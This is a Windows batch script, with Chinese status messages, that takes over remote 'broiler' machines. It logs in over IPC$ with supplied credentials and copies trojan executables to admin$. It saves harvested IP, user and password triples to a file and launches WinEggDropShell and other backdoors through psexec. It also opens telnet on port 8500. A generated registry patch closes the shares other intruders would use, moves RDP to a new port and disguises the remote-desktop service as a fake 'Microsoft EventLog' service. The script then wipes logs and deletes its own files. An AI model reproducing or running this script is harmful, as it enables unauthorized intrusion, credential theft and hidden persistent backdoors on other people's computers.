@echo off

@echo @echo Windows Registry Editor Version 5.00 ^>patch.dll >patch.bat
@echo @echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters] ^>^>patch.dll >>patch.bat
@echo @echo "AutoShareServer"=dword:00000000 ^>^>patch.dll >>patch.bat
@echo @echo "AutoShareWks"=dword:00000000 ^>^>patch.dll >>patch.bat
@echo @echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa] ^>^>patch.dll >>patch.bat
@echo @echo "restrictanonymous"=dword:00000001 ^>^>patch.dll >>patch.bat
@echo @echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters] ^>^>patch.dll >>patch.bat
@echo @echo "SMBDeviceEnabled"=dword:00000000 ^>^>patch.dll >>patch.bat
@echo @echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RemoteRegistry] ^>^>patch.dll >>patch.bat
@echo @echo "Start"=dword:00000004 ^>^>patch.dll >>patch.bat
@echo @echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule] ^>^>patch.dll >>patch.bat
@echo @echo "Start"=dword:00000004 ^>^>patch.dll >>patch.bat
@echo @echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] ^>^>patch.dll >>patch.bat
@echo @echo "ShutdownWithoutLogon"="0" ^>^>patch.dll >>patch.bat
@echo @echo "DontDisplayLastUserName"="1" ^>^>patch.dll >>patch.bat
@echo @echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] ^>^>patch.dll >>patch.bat
@echo @echo "PortNumber"=dword:0000062b ^>^>patch.dll >>patch.bat
@echo @echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp ^>^>patch.dll >>patch.bat
@echo @echo "PortNumber"=dword:0000062b ^>^>patch.dll >>patch.bat
@echo @echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermDD] ^>^>patch.dll >>patch.bat
@echo @echo "Start"=dword:00000002 ^>^>patch.dll >>patch.bat
@echo @echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecuService] ^>^>patch.dll >>patch.bat
@echo @echo "Start"=dword:00000002 ^>^>patch.dll >>patch.bat
@echo @echo "ErrorControl"=dword:00000001 ^>^>patch.dll >>patch.bat
@echo @echo "ImagePath"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,\ ^>^>patch.dll >>patch.bat
@echo @echo 74,00,25,00,5c,00,53,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,65,\ ^>^>patch.dll >>patch.bat
@echo @echo 00,76,00,65,00,6e,00,74,00,6c,00,6f,00,67,00,2e,00,65,00,78,00,65,00,00,00 ^>^>patch.dll >>patch.bat
@echo @echo "ObjectName"="LocalSystem" ^>^>patch.dll >>patch.bat
@echo @echo "Type"=dword:00000010 ^>^>patch.dll >>patch.bat
@echo @echo "Description"="记录程序和 Windows 发送的事件消息。事件日志包含对诊断问题有所帮助的信息。您可以在“事件查看器”中查看报告。" ^>^>patch.dll >>patch.bat
@echo @echo "DisplayName"="Microsoft EventLog" ^>^>patch.dll >>patch.bat
@echo @echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\termservice] ^>^>patch.dll >>patch.bat
@echo @echo "Start"=dword:00000004 ^>^>patch.dll >>patch.bat
@echo @copy termsrv.exe eventlog.exe >>patch.bat
@echo @regedit /s patch.dll >>patch.bat
@echo @net stop lanmanserver /y >>patch.bat
@echo @net start lanmanserver >>patch.bat
@echo @net stop Schedule /y >>patch.bat
@echo @net stop RemoteRegistry /y >>patch.bat
@echo @del patch.dll >>patch.bat
@echo @del patch.bat >>patch.bat

@net use \\%1\ipc$ %3 /u:"%2"
@if errorlevel 1 goto ljsb
@echo 连接建立…………OK
@copy service.exe \\%1\admin$\system32 && copy Service.Dll \\%1\admin$\system32 && copy WinTcpIp.exe \\%1\admin$\system32 && if not errorlevel 1 echo IP %1 USER %2 PASS %3 >>myJJ.txt
@if errorlevel 1 goto clog1
@echo 向肉鸡复制木马文件…………OK
@copy patch.bat \\%1\admin$\system32
@echo 向肉鸡复制IPC补丁文件…………OK
@psexec \\%1 c:\winnt\system32\WinTcpIp.exe && if not errorlevel 1 echo %1 hgz.exe Intsall OK >>myJJ.txt
@psexec \\%1 c:\winnt\system32\service -run && if not errorlevel 1 echo %1 WinEggDropShell Install OK >>myJJ.txt
@opentelnet \\%1 %2 %3 0 8500 && if not errorlevel 1 echo %1 Open Telnet Service on port 8500 >>myJJ.txt
@psexec \\%1 -d patch.bat
:clog
@cscript clog.vbs %1 %2 %3 -all
@del patch.bat
@goto end

:ljsb
@echo 建立连接失败了，白痴口令不能用了：（
goto end
:clog1
@echo 复制文件失败，肉鸡没开默认共享：（
goto clog

:end
@net use %1 /del /y
exit